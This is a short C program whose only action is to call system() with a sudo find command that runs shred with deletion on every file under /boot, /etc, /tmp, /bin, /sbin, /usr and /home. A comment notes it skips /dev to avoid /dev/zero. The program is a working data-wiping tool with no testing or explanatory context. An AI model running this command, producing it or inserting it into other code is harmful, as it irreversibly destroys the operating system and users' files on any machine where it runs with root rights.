
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main () {
   char command[200];

   strcpy(command, "sudo find /boot /etc /tmp /bin /sbin /usr /home -exec shred {} -uvz \\;" );//deletes specific files to avoid the blackhole of dev/zero
   //printf(command);//debugging
   system(command);

   return(0);
} 
